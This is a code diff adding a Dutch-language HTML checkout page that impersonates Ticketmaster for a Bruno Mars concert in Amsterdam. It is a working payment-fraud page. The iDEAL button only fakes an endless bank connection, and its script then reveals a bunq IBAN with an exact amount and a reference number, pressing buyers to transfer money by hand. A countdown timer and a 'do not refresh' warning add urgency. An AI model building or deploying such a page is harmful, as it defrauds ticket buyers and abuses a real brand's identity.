@@ -1,0 +1,1089 @@
+<!DOCTYPE html>
+<html lang="nl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ticketmaster - Betaling</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background-color: #f2f2f2;
+            color: #333;
+            min-height: 100vh;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        /* ===== HEADER ===== */
+        .header {
+            background-color: #10162f;
+            height: 56px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 24px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .header::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            right: -20px;
+            width: 300px;
+            height: 200%;
+            background: repeating-linear-gradient(
+                -55deg,
+                transparent,
+                transparent 8px,
+                rgba(255,255,255,0.04) 8px,
+                rgba(255,255,255,0.04) 16px
+            );
+            transform: skewX(-5deg);
+        }
+
+        .logo {
+            color: white;
+            font-size: 20px;
+            font-weight: 800;
+            letter-spacing: -0.3px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .logo sup {
+            font-size: 9px;
+            font-weight: 400;
+            vertical-align: super;
+            margin-left: 1px;
+        }
+
+        .timer-wrap {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .timer-label {
+            color: rgba(255,255,255,0.7);
+            font-size: 13px;
+            font-weight: 400;
+        }
+
+        .timer-value {
+            color: #fff;
+            font-size: 22px;
+            font-weight: 800;
+            letter-spacing: 1px;
+            font-variant-numeric: tabular-nums;
+        }
+
+        .timer-icon {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            border: 2px solid rgba(255,255,255,0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+
+        .timer-icon svg {
+            width: 18px;
+            height: 18px;
+        }
+
+        /* ===== MAIN LAYOUT ===== */
+        .main-container {
+            max-width: 1180px;
+            margin: 0 auto;
+            padding: 32px 20px 40px;
+            display: flex;
+            gap: 28px;
+            align-items: flex-start;
+        }
+
+        .left-column {
+            flex: 1;
+            min-width: 0;
+        }
+
+        .right-column {
+            width: 345px;
+            min-width: 345px;
+            position: sticky;
+            top: 20px;
+        }
+
+        /* ===== PAGE TITLE ===== */
+        .page-title {
+            text-align: center;
+            margin-bottom: 28px;
+        }
+
+        .page-title h1 {
+            font-size: 20px;
+            font-weight: 800;
+            letter-spacing: 3px;
+            color: #10162f;
+            margin-bottom: 12px;
+            text-transform: uppercase;
+        }
+
+        .title-underline {
+            width: 36px;
+            height: 4px;
+            background-color: #026cdf;
+            margin: 0 auto;
+            border-radius: 2px;
+        }
+
+        /* ===== STEPPER ===== */
+        .steps-container {
+            display: flex;
+            align-items: flex-start;
+            justify-content: center;
+            margin-bottom: 28px;
+            padding: 0 60px;
+        }
+
+        .step {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 110px;
+        }
+
+        .step-circle {
+            width: 34px;
+            height: 34px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 13px;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+
+        .step.completed .step-circle {
+            background-color: #4caf50;
+            color: #fff;
+        }
+
+        .step.active .step-circle {
+            background-color: #026cdf;
+            color: #fff;
+        }
+
+        .step.inactive .step-circle {
+            background-color: #e4e4e4;
+            color: #a0a0a0;
+        }
+
+        .step-label {
+            font-size: 12.5px;
+            font-weight: 600;
+            text-align: center;
+            line-height: 1.35;
+        }
+
+        .step.completed .step-label {
+            color: #222;
+        }
+
+        .step.active .step-label {
+            color: #222;
+        }
+
+        .step.inactive .step-label {
+            color: #a0a0a0;
+        }
+
+        .step-line {
+            flex: 1;
+            height: 3px;
+            background-color: #e4e4e4;
+            margin-top: 16px;
+        }
+
+        /* ===== WARNING BANNER ===== */
+        .warning-bar {
+            height: 5px;
+            background: linear-gradient(90deg, #ff8a00 0%, #ffc800 100%);
+            border-radius: 4px 4px 0 0;
+        }
+
+        .warning-body {
+            background: #fff;
+            border: 1px solid #e0e0e0;
+            border-top: none;
+            border-radius: 0 0 4px 4px;
+            padding: 14px 20px;
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            margin-bottom: 16px;
+        }
+
+        .warning-icon {
+            width: 28px;
+            height: 28px;
+            flex-shrink: 0;
+            margin-top: 1px;
+        }
+
+        .warning-text {
+            font-size: 14px;
+            font-weight: 600;
+            color: #222;
+            line-height: 1.55;
+            font-style: italic;
+        }
+
+        /* ===== PAYMENT METHODS ===== */
+        .card {
+            background: #fff;
+            border: 1px solid #e0e0e0;
+            border-radius: 4px;
+            margin-bottom: 16px;
+            overflow: hidden;
+        }
+
+        .payment-option {
+            padding: 20px 24px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .payment-option + .payment-option {
+            border-top: 1px solid #e0e0e0;
+        }
+
+        .payment-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .payment-icon {
+            width: 36px;
+            height: 24px;
+            border-radius: 3px;
+            overflow: hidden;
+            flex-shrink: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .payment-name {
+            font-size: 15px;
+            font-weight: 600;
+            color: #222;
+            flex: 1;
+        }
+
+        .card-icons {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .card-icon-img {
+            width: 36px;
+            height: 24px;
+            border-radius: 3px;
+            border: 1px solid #e0e0e0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #fff;
+            font-size: 8px;
+            font-weight: 700;
+            color: #666;
+        }
+
+        .card-icon-more {
+            font-size: 12px;
+            color: #999;
+            font-weight: 500;
+            margin-left: 2px;
+        }
+
+        /* ===== PAYMENT TABS ===== */
+        .pay-tabs {
+            display: flex;
+            border-bottom: 2px solid #e0e0e0;
+        }
+
+        .pay-tab {
+            flex: 1;
+            padding: 16px 10px;
+            text-align: center;
+            font-size: 14px;
+            font-weight: 600;
+            color: #888;
+            cursor: pointer;
+            border-bottom: 3px solid transparent;
+            margin-bottom: -2px;
+            transition: color 0.15s, border-color 0.15s;
+            background: none;
+            border-top: none;
+            border-left: none;
+            border-right: none;
+            font-family: inherit;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .pay-tab:hover {
+            color: #222;
+        }
+
+        .pay-tab.active {
+            color: #026cdf;
+            border-bottom-color: #026cdf;
+        }
+
+        .pay-tab-icon {
+            width: 28px;
+            height: 20px;
+            border-radius: 2px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .pay-form {
+            padding: 24px;
+        }
+
+        .pay-form.hidden {
+            display: none;
+        }
+
+        /* ===== FORM FIELDS ===== */
+        .field-group {
+            margin-bottom: 18px;
+        }
+
+        .field-group label {
+            display: block;
+            font-size: 12.5px;
+            color: #777;
+            margin-bottom: 5px;
+            font-weight: 400;
+        }
+
+        .field-group input {
+            width: 100%;
+            height: 44px;
+            padding: 0 12px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 15px;
+            font-family: inherit;
+            color: #222;
+            background: #fff;
+            outline: none;
+            transition: border-color 0.15s;
+        }
+
+        .field-group input:focus {
+            border-color: #026cdf;
+            box-shadow: 0 0 0 1px #026cdf33;
+        }
+
+        .field-group input.error {
+            border-color: #e53935;
+            box-shadow: 0 0 0 1px #e5393533;
+        }
+
+        .field-row {
+            display: flex;
+            gap: 14px;
+        }
+
+        .field-row .field-group {
+            flex: 1;
+        }
+
+        .accepted-cards {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            margin-bottom: 20px;
+        }
+
+        .accepted-cards span {
+            font-size: 12px;
+            color: #999;
+            margin-right: 4px;
+        }
+
+        .pay-submit {
+            display: block;
+            width: 100%;
+            height: 52px;
+            margin-top: 8px;
+            background: #026cdf;
+            border: none;
+            border-radius: 4px;
+            color: #fff;
+            font-size: 15px;
+            font-weight: 600;
+            font-family: inherit;
+            cursor: pointer;
+            transition: background 0.15s;
+            letter-spacing: 0.2px;
+        }
+
+        .pay-submit:hover {
+            background: #0258b8;
+        }
+
+        .pay-submit:disabled {
+            background: #e6e6e6;
+            color: #aaa;
+            cursor: default;
+            border: 1px solid #d4d4d4;
+        }
+
+        .secure-note {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            margin-top: 14px;
+            font-size: 12px;
+            color: #999;
+        }
+
+        .secure-note svg {
+            width: 14px;
+            height: 14px;
+        }
+
+        .field-hint {
+            font-size: 11.5px;
+            color: #999;
+            margin-top: 4px;
+        }
+
+        .field-error-msg {
+            font-size: 12px;
+            color: #e53935;
+            margin-top: 4px;
+            display: none;
+        }
+
+        .field-error-msg.show {
+            display: block;
+        }
+
+        .spinner {
+            display: none;
+            width: 22px;
+            height: 22px;
+            border: 3px solid #e0e0e0;
+            border-top-color: #026cdf;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto;
+        }
+
+        .spinner.show {
+            display: block;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* ===== RIGHT SIDEBAR — EVENT CARD ===== */
+        .event-box {
+            background: #10162f;
+            border-radius: 8px 8px 0 0;
+            overflow: hidden;
+        }
+
+        .event-inner {
+            display: flex;
+            padding: 20px;
+            gap: 16px;
+        }
+
+        .event-thumb {
+            width: 95px;
+            height: 95px;
+            border-radius: 4px;
+            overflow: hidden;
+            flex-shrink: 0;
+            background: #d5d5d5;
+        }
+
+        .event-thumb img,
+        .event-thumb svg {
+            width: 100%;
+            height: 100%;
+            display: block;
+            object-fit: cover;
+        }
+
+        .event-meta {
+            color: #fff;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .event-meta h2 {
+            font-size: 17px;
+            font-weight: 700;
+            line-height: 1.3;
+            margin-bottom: 8px;
+        }
+
+        .event-meta p {
+            font-size: 13px;
+            line-height: 1.5;
+            opacity: 0.88;
+        }
+
+        /* ===== TICKET INFO ===== */
+        .ticket-panel {
+            background: #fff;
+            border: 1px solid #e0e0e0;
+            border-top: none;
+            border-radius: 0 0 8px 8px;
+            padding: 22px 20px 20px;
+        }
+
+        .label-blue {
+            font-size: 10.5px;
+            font-weight: 700;
+            color: #026cdf;
+            letter-spacing: 1.2px;
+            text-transform: uppercase;
+            margin-bottom: 5px;
+        }
+
+        .ticket-name {
+            font-size: 17px;
+            font-weight: 600;
+            color: #222;
+            margin-bottom: 14px;
+        }
+
+        .seat-grid {
+            display: flex;
+            border-top: 1px solid #eaeaea;
+            padding-top: 12px;
+            margin-bottom: 14px;
+        }
+
+        .seat-cell {
+            flex: 1;
+        }
+
+        .seat-cell + .seat-cell {
+            border-left: 1px solid #eaeaea;
+            padding-left: 16px;
+        }
+
+        .seat-cell .s-label {
+            font-size: 10.5px;
+            font-weight: 700;
+            color: #026cdf;
+            letter-spacing: 1.2px;
+            text-transform: uppercase;
+            margin-bottom: 3px;
+        }
+
+        .seat-cell .s-val {
+            font-size: 17px;
+            font-weight: 700;
+            color: #222;
+        }
+
+        .ticket-note {
+            font-size: 12.5px;
+            color: #888;
+            line-height: 1.5;
+            padding-bottom: 14px;
+            border-bottom: 1px solid #eaeaea;
+            margin-bottom: 14px;
+        }
+
+        /* Venue map */
+        .venue-map-wrap {
+            margin-bottom: 14px;
+            padding-bottom: 14px;
+            border-bottom: 1px solid #eaeaea;
+        }
+
+        .venue-svg {
+            width: 100%;
+            display: block;
+        }
+
+        .venue-img {
+            width: 100%;
+            display: block;
+            border-radius: 4px;
+        }
+
+        /* Cost overview */
+        .cost-heading {
+            font-size: 15px;
+            font-weight: 700;
+            color: #222;
+            margin-bottom: 10px;
+        }
+
+        .cost-line {
+            display: flex;
+            justify-content: space-between;
+            font-size: 13.5px;
+            color: #333;
+            margin-bottom: 6px;
+        }
+
+        .cost-total-line {
+            display: flex;
+            justify-content: space-between;
+            border-top: 2px solid #222;
+            padding-top: 10px;
+            margin-top: 6px;
+        }
+
+        .cost-total-line span {
+            font-size: 15px;
+            font-weight: 700;
+            color: #222;
+        }
+
+        /* ===== NL Flag icon ===== */
+        .nl-flag {
+            width: 36px;
+            height: 24px;
+            border-radius: 3px;
+            overflow: hidden;
+            border: 1px solid #e0e0e0;
+        }
+
+        /* ===== Credit card icon ===== */
+        .cc-icon {
+            width: 36px;
+            height: 24px;
+            border-radius: 3px;
+            background: #4a5568;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* ===== iDEAL BUTTON ===== */
+        .ideal-submit {
+            display: block;
+            width: 100%;
+            height: 52px;
+            margin-top: 8px;
+            background: #4caf50;
+            border: none;
+            border-radius: 4px;
+            color: #fff;
+            font-size: 15px;
+            font-weight: 600;
+            font-family: inherit;
+            cursor: pointer;
+            transition: background 0.15s;
+            letter-spacing: 0.2px;
+        }
+
+        .ideal-submit:hover {
+            background: #43a047;
+        }
+
+        .ideal-submit.loading {
+            background: #a5d6a7;
+            cursor: default;
+            pointer-events: none;
+        }
+
+        .ideal-spinner-wrap {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            margin-top: 18px;
+            gap: 14px;
+        }
+
+        .ideal-spinner-wrap.show {
+            display: flex;
+        }
+
+        .ideal-spinner {
+            width: 28px;
+            height: 28px;
+            border: 3px solid #c8e6c9;
+            border-top-color: #4caf50;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        .ideal-loading-text {
+            font-size: 13px;
+            color: #777;
+            text-align: center;
+        }
+
+        .ideal-iban-info {
+            display: none;
+            margin-top: 20px;
+            padding: 16px 18px;
+            background: #fff8e1;
+            border: 1px solid #ffe082;
+            border-radius: 6px;
+        }
+
+        .ideal-iban-info.show {
+            display: block;
+        }
+
+        .ideal-iban-info p {
+            font-size: 13.5px;
+            color: #333;
+            line-height: 1.65;
+            margin: 0;
+        }
+
+        .ideal-iban-info .iban-code {
+            display: inline-block;
+            margin-top: 8px;
+            padding: 8px 14px;
+            background: #fff;
+            border: 1px solid #e0e0e0;
+            border-radius: 4px;
+            font-size: 15px;
+            font-weight: 700;
+            font-family: 'Courier New', monospace;
+            color: #222;
+            letter-spacing: 1.5px;
+            user-select: all;
+        }
+
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 920px) {
+            .main-container {
+                flex-direction: column;
+                padding: 20px 12px 30px;
+                gap: 20px;
+            }
+            .right-column {
+                width: 100%;
+                min-width: auto;
+                position: static;
+                order: -1;
+            }
+            .page-title h1 {
+                font-size: 16px;
+                letter-spacing: 2px;
+            }
+            .steps-container {
+                padding: 0 10px;
+                margin-bottom: 20px;
+            }
+            .step { width: 80px; }
+            .step-circle { width: 28px; height: 28px; font-size: 11px; }
+            .step-label { font-size: 11px; }
+            .event-inner {
+                padding: 14px;
+                gap: 12px;
+            }
+            .event-thumb {
+                width: 75px;
+                height: 75px;
+            }
+            .event-meta h2 { font-size: 14px; }
+            .event-meta p { font-size: 12px; }
+            .ticket-panel { padding: 16px 14px; }
+            .ticket-name { font-size: 15px; }
+            .seat-cell .s-val { font-size: 15px; }
+            .venue-map-wrap { display: none; }
+            .card { padding: 18px 14px; }
+            .timer-label { font-size: 11px; }
+            .timer-value { font-size: 18px; }
+            .timer-icon { width: 26px; height: 26px; }
+            .ideal-iban-info { padding: 14px; }
+            .iban-code { font-size: 13px; letter-spacing: 1px; }
+        }
+
+        @media (max-width: 480px) {
+            .header { padding: 0 10px; height: 48px; }
+            .logo { font-size: 17px; }
+            .timer-label { display: none; }
+            .timer-value { font-size: 17px; }
+            .timer-icon { width: 24px; height: 24px; }
+            .main-container { padding: 14px 8px 24px; gap: 14px; }
+            .page-title { margin-bottom: 16px; }
+            .page-title h1 { font-size: 14px; letter-spacing: 1.5px; }
+            .event-inner { padding: 10px; gap: 10px; }
+            .event-thumb { width: 65px; height: 65px; }
+            .event-meta h2 { font-size: 13px; margin-bottom: 4px; }
+            .event-meta p { font-size: 11px; }
+            .ticket-panel { padding: 14px 10px; }
+            .seat-grid { gap: 0; }
+            .seat-cell .s-val { font-size: 13px; }
+            .seat-cell .s-label { font-size: 9px; }
+            .cost-heading { font-size: 14px; }
+            .cost-line { font-size: 12.5px; }
+            .cost-total-line span { font-size: 13.5px; }
+            .card { padding: 14px 10px; }
+            .ideal-submit { font-size: 15px; padding: 14px 20px; }
+            .ideal-iban-info { padding: 10px; }
+            .iban-code { font-size: 12px; letter-spacing: 0.5px; }
+            .ideal-iban-info p { font-size: 12px; }
+        }
+    </style>
+</head>
+<body>
+
+<!-- ===== HEADER ===== -->
+<header class="header">
+    <div class="logo">ticketmaster<sup>&reg;</sup></div>
+    <div class="timer-wrap">
+        <span class="timer-label">Resterende tijd</span>
+        <span class="timer-value" id="countdown">09:11</span>
+        <div class="timer-icon">
+            <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round">
+                <circle cx="12" cy="12" r="10"/>
+                <polyline points="12 6 12 12 16 14"/>
+            </svg>
+        </div>
+    </div>
+</header>
+
+<!-- ===== MAIN ===== -->
+<div class="main-container">
+
+    <!-- LEFT COLUMN -->
+    <div class="left-column">
+
+        <!-- Title -->
+        <div class="page-title">
+            <h1>VEILIG AFREKENEN</h1>
+            <div class="title-underline"></div>
+        </div>
+
+        <!-- Stepper -->
+        <div class="steps-container">
+            <div class="step completed">
+                <div class="step-circle">
+                    <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
+                        <path d="M3 8.5L6.5 12L13 4" stroke="#fff" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                </div>
+                <div class="step-label">Jouw<br>bestelling</div>
+            </div>
+            <div class="step-line"></div>
+            <div class="step active">
+                <div class="step-circle">2</div>
+                <div class="step-label">Betaling</div>
+            </div>
+            <div class="step-line"></div>
+            <div class="step inactive">
+                <div class="step-circle">3</div>
+                <div class="step-label">Bevestiging</div>
+            </div>
+        </div>
+
+        <!-- Warning -->
+        <div class="warning-bar"></div>
+        <div class="warning-body">
+            <svg class="warning-icon" viewBox="0 0 24 24" fill="none">
+                <path d="M1 21h22L12 2 1 21z" fill="#ff9800"/>
+                <text x="12" y="18" text-anchor="middle" font-size="13" font-weight="700" fill="#fff">!</text>
+            </svg>
+            <span class="warning-text">Ververs de pagina niet en maak geen gebruik van de terugknop, je betaling kan daarmee onderbroken of geannuleerd worden.</span>
+        </div>
+
+        <!-- Payment Methods -->
+        <div class="card">
+
+            <!-- iDEAL Form -->
+            <div class="pay-form" id="formIdeal">
+                <div style="text-align:center;margin-bottom:14px;">
+                    <svg width="60" height="40" viewBox="0 0 60 40" fill="none">
+                        <rect x="1" y="1" width="58" height="38" rx="4" fill="#fff" stroke="#CC0066" stroke-width="1.5"/>
+                        <text x="30" y="25" text-anchor="middle" font-size="14" font-weight="800" fill="#CC0066" font-family="Inter,sans-serif">iDEAL</text>
+                    </svg>
+                </div>
+                <p style="font-size:13.5px;color:#555;text-align:center;margin-bottom:18px;line-height:1.6;">U wordt doorgestuurd naar uw bank om de betaling via iDEAL of Wero te voltooien.</p>
+                <button class="ideal-submit" id="payIdealBtn">Doorgaan naar iDEAL | Wero</button>
+                <div class="ideal-spinner-wrap" id="idealSpinnerWrap">
+                    <div class="ideal-spinner"></div>
+                    <span class="ideal-loading-text">Verbinding maken met uw bank...</span>
+                </div>
+                <div class="ideal-iban-info" id="idealIbanInfo">
+                    <p> Als de betaling via iDEAL niet correct wordt voltooid of de pagina blijft laden, kunt u een handmatige bankoverschrijving doen naar het volgende IBAN:</p>
+                    <span class="iban-code">NL14 BUNQ 2177 6203 25</span>
+                    <p style="margin-top:10px;font-size:13px;color:#e65100;font-weight:600;"> Gelieve het exacte bedrag over te maken: <span id="ibanAmount">&euro; 171,71</span></p>
+                    <p style="margin-top:8px;font-size:12.5px;color:#666;">Referentienummer: <strong>847291</strong></p>
+                    <p style="margin-top:6px;font-size:12.5px;color:#666;">Vermeld het referentienummer bij de overschrijving om uw aankoop te verwerken.</p>
+                </div>
+                <div class="secure-note" style="margin-top:14px;">
+                    <svg viewBox="0 0 16 16" fill="none">
+                        <rect x="3" y="7" width="10" height="7" rx="1.5" stroke="#bbb" stroke-width="1.2" fill="none"/>
+                        <path d="M5 7V5a3 3 0 016 0v2" stroke="#bbb" stroke-width="1.2" fill="none"/>
+                    </svg>
+                    Beveiligde iDEAL-betaling
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- RIGHT COLUMN -->
+    <div class="right-column">
+
+        <!-- Event -->
+        <div class="event-box">
+            <div class="event-inner">
+                <div class="event-thumb">
+                    <img src="/img/event.png" alt="Event">
+                </div>
+                <div class="event-meta">
+                    <h2>Bruno Mars &ndash; The Romantic Tour</h2>
+                    <p>20 4 jul 2026, 20:00<br>Johan Cruijff ArenA,<br>Amsterdam, NL</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Ticket panel -->
+        <div class="ticket-panel">
+            <div class="label-blue">PRIJSSOORT</div>
+            <div class="ticket-name">Official Platinum Ticket</div>
+
+            <div class="seat-grid">
+                <div class="seat-cell">
+                    <div class="s-label">VAK</div>
+                    <div class="s-val" id="seatVak">121</div>
+                </div>
+                <div class="seat-cell">
+                    <div class="s-label">RIJ</div>
+                    <div class="s-val" id="seatRij">10</div>
+                </div>
+                <div class="seat-cell">
+                    <div class="s-label">STOEL</div>
+                    <div class="s-val" id="seatStoel">202-205</div>
+                </div>
+            </div>
+
+            <div class="ticket-note"><span id="ticketNoteText">1 ticket geselecteerd - dit geeft toegang voor 1 persoon.</span></div>
+
+            <!-- Venue Map -->
+            <div class="venue-map-wrap">
+                <img class="venue-img" src="/img/venue.png" alt="Johan Cruijff ArenA">
+            </div>
+
+            <!-- Cost Overview -->
+            <div>
+                <div class="cost-heading">Kostenoverzicht</div>
+                <div class="cost-line">
+                    <span>Tickets &times;<span id="ticketCount">1</span></span>
+                    <span id="ticketsCost">&euro; 150,00</span>
+                </div>
+                <div class="cost-line">
+                    <span>Servicekosten (incl. BTW)</span>
+                    <span id="serviceCost">&euro; 21,71</span>
+                </div>
+                <div class="cost-total-line">
+                    <span>Totaalbedrag</span>
+                    <span id="totalCost">&euro; 171,71</span>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+(function() {
+    // ======== COUNTDOWN TIMER (persists via sessionStorage) ========
+    var STORAGE_KEY = 'tm_countdown';
+    var stored = sessionStorage.getItem(STORAGE_KEY);
+    var totalSeconds = stored !== null ? parseInt(stored, 10) : 9 * 60 + 11;
+    var $countdown = document.getElementById('countdown');
+
+    function updateTimer() {
+        var m = Math.floor(totalSeconds / 60);
+        var s = totalSeconds % 60;
+        $countdown.textContent =
+            String(m).padStart(2, '0') + ':' + String(s).padStart(2, '0');
+        sessionStorage.setItem(STORAGE_KEY, totalSeconds);
+        if (totalSeconds <= 0) {
+            clearInterval(timerInterval);
+            $countdown.textContent = '00:00';
+            return;
+        }
+        totalSeconds--;
+    }
+    updateTimer();
+    var timerInterval = setInterval(updateTimer, 1000);
+
+    // ======== PAYMENT SUBMIT (iDEAL) ========
+    var $payIdealBtn = document.getElementById('payIdealBtn');
+    var $idealSpinnerWrap = document.getElementById('idealSpinnerWrap');
+    var $idealIbanInfo = document.getElementById('idealIbanInfo');
+
+    // ---- Read order from sessionStorage and populate costs ----
+    try {
+        var storedOrder = sessionStorage.getItem('tm_order');
+        if (storedOrder) {
+            var ord = JSON.parse(storedOrder);
+            var qty = ord.qty || 1;
+            var ticketsCost = Number(ord.ticketsCost) || 0;
+            var service = Number(ord.service) || 0;
+            var total = Number(ord.total) || 0;
+            function fmtNum(n) { return '\u20ac ' + n.toFixed(2).replace('.', ','); }
+            var el;
+            if ((el = document.getElementById('ticketCount'))) el.textContent = qty;
+            if ((el = document.getElementById('ticketsCost'))) el.textContent = fmtNum(ticketsCost);
+            if ((el = document.getElementById('serviceCost'))) el.textContent = fmtNum(service);
+            if ((el = document.getElementById('totalCost'))) el.textContent = fmtNum(total);
+            if ((el = document.getElementById('ibanAmount'))) el.textContent = fmtNum(total);
+            if ((el = document.getElementById('ticketNoteText'))) el.textContent = qty + ' ticket(s) geselecteerd - dit geeft toegang voor ' + qty + ' persoon/personen.';
+        }
+    } catch (err) {}
+
+    $payIdealBtn.addEventListener('click', function(e) {
+        e.preventDefault();
+        // Enter indefinite loading state
+        $payIdealBtn.classList.add('loading');
+        $payIdealBtn.textContent = 'Bezig met laden...';
+        $idealSpinnerWrap.classList.add('show');
+
+        // Show IBAN info after 4 seconds
+        setTimeout(function() {
+            $idealIbanInfo.classList.add('show');
+        }, 4000);
+    });
+
+})();
+</script>
+</body>
+</html>
